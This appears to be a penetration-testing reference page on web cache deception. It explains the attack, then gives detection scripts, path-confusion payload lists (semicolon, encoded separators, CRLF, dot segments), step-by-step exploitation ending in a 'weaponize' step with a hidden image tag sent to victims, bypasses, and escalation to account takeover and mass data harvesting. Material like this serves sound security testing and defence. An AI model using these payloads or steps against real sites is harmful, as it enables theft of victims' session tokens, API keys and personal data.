# Web Cache Deception

> **Summary**: Web cache deception tricks a caching proxy into storing a victim's authenticated dynamic response under a URL the attacker can later access, leaking sensitive data such as tokens, PII, or API keys.
> **Impact**: Theft of session tokens, personal data, API keys, CSRF tokens, or any sensitive content rendered in authenticated responses -- leading to account takeover or mass data exfiltration.
> **Typical Severity**: High | Critical

## Cache Deception vs Cache Poisoning

| Aspect | Cache Deception | Cache Poisoning |
|--------|-----------------|-----------------|
| **Who visits the malicious URL?** | The **victim** visits the crafted URL | The **attacker** sends the poisoned request |
| **What gets cached?** | Victim's **authentic sensitive response** | Attacker's **malicious content** |
| **Who benefits from the cache?** | The **attacker** reads the cached response | **Other users** receive the poisoned content |
| **Attack direction** | Victim -> cache -> attacker reads | Attacker -> cache -> victims receive |

For cache poisoning techniques, see [Web Cache Poisoning](cache-poisoning.md).

## How It Works

1. **Attacker crafts a URL**: appends a static file extension or path segment to a dynamic, authenticated endpoint (e.g., `/api/user/profile.css`)
2. **Attacker tricks the victim** into visiting the crafted URL (via phishing, social engineering, embedded image tags, etc.)
3. **Victim's browser sends the request** with their authentication cookies -- the origin server processes it as the dynamic endpoint and returns sensitive data
4. **The cache proxy** sees the `.css` extension and caches the response as a static resource
5. **Attacker requests the same URL** without authentication and receives the cached response containing the victim's sensitive data

## Detection

### Indicators
- Caching headers present in responses to dynamic endpoints:
  - `X-Cache: HIT` / `X-Cache: MISS`
  - `CF-Cache-Status: HIT` (Cloudflare)
  - `X-Cache-Hits: 1` (Varnish)
  - `Age: <seconds>` (indicates time in cache)
  - `Cache-Control: public, max-age=<N>`
  - `X-Served-By` / `X-Cache-Lookup` (Akamai/Fastly)
- Dynamic endpoints that do not set `Cache-Control: no-store, private`
- Origin server ignores path suffixes (returns same content for `/profile` and `/profile.css`)
- CDN/reverse proxy caches based on file extension rather than `Content-Type` header

### Automated Detection

#### CacheDecepHound
```bash
python3 CacheDecepHound.py -u https://<TARGET>/api/user/profile -w <EXTENSIONS_WORDLIST>
```

#### Custom Script -- Test Extension-Based Caching
```bash
# Test if appending static extensions causes caching
for ext in .css .js .png .jpg .gif .svg .ico .woff2 .avif; do
  echo "Testing: /api/user/profile${ext}"
  curl -s -o /dev/null -D - "https://<TARGET>/api/user/profile${ext}" \
    -H "Cookie: session=<VICTIM_SESSION>" | grep -iE "x-cache|cf-cache|age:|cache-control"
done
```

#### Nuclei Template
```bash
nuclei -u https://<TARGET>/api/user/profile -t cache-deception.yaml
```

### Manual Detection

1. **Identify a dynamic authenticated endpoint** that returns sensitive data (e.g., `/account`, `/api/me`, `/profile`)
2. **Request the endpoint with a static extension appended**:
   ```http
   GET /account/settings.css HTTP/1.1
   Host: <TARGET>
   Cookie: session=<YOUR_SESSION>
   ```
3. **Check if the response contains the same sensitive data** as `/account/settings`
4. **Inspect caching headers**: look for `X-Cache: HIT` or `Age: > 0` on the second request
5. **Request the same URL from an unauthenticated browser** -- if sensitive data is returned, cache deception is confirmed
   - **Success criteria**: unauthenticated request returns authenticated user's data

## Exploitation

### Prerequisites
- A dynamic endpoint that returns sensitive data when authenticated
- A caching layer (CDN, reverse proxy) that caches based on file extension or path patterns
- The origin server ignores or tolerates path suffixes/confusion
- Ability to make the victim visit a crafted URL

### Path Confusion Techniques

#### 1. Static File Extension Appending
```
/api/user/profile.css
/api/user/profile.js
/api/user/profile.png
/api/user/profile.avif
/account/settings.woff2
/me.svg
```

#### 2. Path Parameter Injection (Semicolon)
```
/api/user/profile;.css
/api/user/profile;test.js
/account;anything.png
```
Spring framework treats `;` as a matrix variable delimiter, so `/profile;.css` resolves to `/profile` on the origin but the cache sees a `.css` extension.

#### 3. Encoded Path Separators
```
/api/user/profile%2f.css
/api/user/profile%23.css
/api/user/profile%3f.css
/api/user/profile%00.css
```
- `%2f` = `/` -- some caches treat this literally while the origin decodes it
- `%23` = `#` -- truncates the path on the origin
- `%3f` = `?` -- treated as query string by origin but literal path by cache
- `%00` = null byte -- truncates on some servers (OpenLiteSpeed)

#### 4. Dot Segment Path Traversal
```
/static/../api/user/profile
/assets/../account/settings
/api/user/profile/..%2fstatic/anything.css
/api/user/profile/..%2f..%2fstatic.css
```
Cache may store under `/static/anything.css` while origin resolves to `/api/user/profile`.

#### 5. Static Directory Prefix
```
/static/../account/settings
/assets/../api/me
/wp-content/../account/profile
/media/../api/user/data
```

#### 6. Newline / CRLF Injection in Path
```
/api/user/profile%0a.css
/api/user/profile%0d%0a.css
```
Nginx truncates at newline bytes, so the origin sees `/api/user/profile` while the cache processes the full path.

#### 7. Lesser-Known Extensions
```
/profile.avif
/profile.woff2
/profile.ico
/profile.7z
/profile.csv
```
CDNs like Cloudflare cache a wide range of static extensions including `.avif`, `.woff2`, `.7z`, `.csv`, etc.

### CDN-Specific Behaviors

| CDN/Proxy | Behavior |
|-----------|----------|
| **Cloudflare** | Caches based on extension (`.css`, `.js`, `.png`, `.avif`, etc.); CF-Cache-Status header; does NOT decode `%2F` in path |
| **Akamai** | Configurable caching rules; may cache based on directory patterns; check `X-Cache` and `X-Cache-Key` |
| **Fastly/Varnish** | Caches based on `Cache-Control` and VCL rules; check `X-Cache`, `X-Cache-Hits`, `Age` |
| **nginx** | `proxy_cache` often keys on URI; truncates at `%0a`; may normalize dot segments |
| **AWS CloudFront** | Caches based on behavior patterns; check `X-Cache`, `Via` headers |
| **Azure CDN** | Caches based on extension and caching rules; check `X-EC-Debug` headers |

### Delimiter-Based Cache Deception

Different frameworks use different path delimiters that the cache may not recognize:

| Delimiter | Framework | Example |
|-----------|-----------|---------|
| `;` | Spring (Java) | `/profile;.css` -> origin sees `/profile` |
| `.` | Ruby on Rails | `/profile.css` -> origin sees `/profile` (format: css) |
| `%00` | OpenLiteSpeed | `/profile%00.css` -> origin sees `/profile` |
| `%0a` | Nginx | `/profile%0a.css` -> origin sees `/profile` |
| `%23` | Various | `/profile%23.css` -> origin sees `/profile` |

### Step-by-Step Exploitation

1. **Identify sensitive dynamic endpoint** -- find an authenticated page returning PII, tokens, or session data (e.g., `/api/me`)
   - **Success criteria**: endpoint returns sensitive data (email, name, tokens) with your session

2. **Test path confusion** -- append static extensions and check if the origin still returns the dynamic content:
   ```http
   GET /api/me.css HTTP/1.1
   Host: <TARGET>
   Cookie: session=<YOUR_SESSION>
   ```
   - **Success criteria**: response body matches `/api/me` content despite `.css` suffix

3. **Confirm caching** -- send the request twice and check for cache headers:
   ```
   First request:  X-Cache: MISS
   Second request: X-Cache: HIT, Age: > 0
   ```
   - **Success criteria**: second request shows cache HIT

4. **Verify unauthenticated access** -- request the same URL without cookies from a different browser/session:
   ```http
   GET /api/me.css HTTP/1.1
   Host: <TARGET>
   ```
   - **Success criteria**: response contains the authenticated user's sensitive data

5. **Weaponize** -- craft the exploit URL and deliver to the victim:
   ```html
   <img src="https://<TARGET>/api/me.css" style="display:none">
   ```
   Or embed in an email/message to trigger the victim's browser to load (and cache) their data.

6. **Harvest cached data** -- after the victim visits the link, access the same URL to retrieve their cached sensitive response

### What Data to Extract
- **Session tokens** / CSRF tokens embedded in HTML
- **API keys** returned in authenticated API responses
- **PII**: email, name, address, phone number
- **Financial data**: account balances, transaction history
- **JWT tokens** or refresh tokens in response bodies
- **OAuth access tokens** from token endpoints

### Proof of Concept

#### CSPT-Assisted Cache Deception (Account Takeover)
If the SPA concatenates user-controlled path segments into API calls:
```
# Victim is tricked into visiting:
https://<TARGET>/user?userId=../../../v1/token.css

# SPA performs authenticated fetch to:
https://api.<TARGET>/v1/users/info/../../../v1/token.css

# Browser normalizes to:
https://api.<TARGET>/v1/token.css

# CDN caches the token JSON -- attacker retrieves it unauthenticated:
curl https://api.<TARGET>/v1/token.css
```

#### Automated Extension Fuzzing
```bash
ffuf -u "https://<TARGET>/api/me.FUZZ" \
  -H "Cookie: session=<YOUR_SESSION>" \
  -w /opt/SecLists/Discovery/Web-Content/web-extensions.txt \
  -mc 200 \
  -mr "<SENSITIVE_KEYWORD>" \
  -o cache-deception-results.json
```

## Bypasses

- **Extension variations**: try `.avif`, `.woff2`, `.7z`, `.csv`, `.ttf` if common extensions (`.css`, `.js`) are blocked
- **Double extension**: `/profile.html.css`, `/profile.json.js`
- **Path parameter bypass**: `/profile;cachebuster=1.css` -- randomize the parameter to avoid existing cache entries
- **URL encoding layers**: `/profile%252f.css` (double encoding)
- **Mixed case extensions**: `/profile.CSS`, `/profile.Js`
- **Query string cache busters**: `/profile.css?cb=<RANDOM>` -- ensures a fresh cache entry per victim
- **Fragment trick**: `/profile.css#fragment` -- some caches ignore fragments
- **Trailing characters**: `/profile.css/`, `/profile.css%20`
- **Combine with request smuggling**: use [Request Smuggling](request-smuggling.md) to force the cache to store an authenticated response under a static-looking key

## Escalation

- Chain with **XSS/Phishing**: deliver the malicious URL via reflected XSS or phishing to force victim navigation
- Chain with [CORS](cors.md): if CORS is misconfigured, read cached cross-origin responses programmatically
- Chain with [Cache Poisoning](cache-poisoning.md): combine deception (steal data) with poisoning (inject payloads) for comprehensive cache attacks
- Chain with **CSPT (Client-Side Path Traversal)**: redirect SPA authenticated fetches to cacheable paths for zero-click ATO
- **Mass exploitation**: cache deception URLs can be embedded in emails or ads to harvest data from many victims simultaneously
- **Token theft -> ATO**: extract session tokens or JWTs from cached responses to perform full [Account Takeover](../authentication/account-takeover.md)

## Tools

| Tool | Usage |
|------|-------|
| [CacheDecepHound](https://github.com/g4nkd/CacheDecepHound) | Python scanner for cache deception vulnerabilities |
| [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) | Automated cache poisoning and deception testing (`wcvs -u <TARGET>`) |
| [toxicache](https://github.com/xhzeem/toxicache) | Golang scanner for web cache poisoning in URL lists |
| Burp Suite Repeater | Manual testing of path confusion with header inspection |
| [ffuf](https://github.com/ffuf/ffuf) | Extension and path fuzzing for cache deception discovery |
| [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Burp extension for discovering unkeyed inputs |
| Browser DevTools (Network tab) | Inspect `X-Cache`, `Age`, `CF-Cache-Status` headers |

## References
- [PortSwigger - Web Cache Deception](https://portswigger.net/web-security/web-cache-deception)
- [PortSwigger Research - Gotta Cache Em All](https://portswigger.net/research/gotta-cache-em-all)
- [HackerOne Report #593712 - Web Cache Deception](https://hackerone.com/reports/593712)
- [OWASP - Web Cache Deception](https://owasp.org/www-community/attacks/Web_Cache_Deception)
- [Cache Deception + CSPT: Account Takeover](https://zere.es/posts/cache-deception-cspt-account-takeover/)
- [ChatGPT ATO via Cache Deception (nokline)](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)
- [HackTricks - Cache Poisoning and Cache Deception](https://book.hacktricks.wiki/en/pentesting-web/cache-deception/)
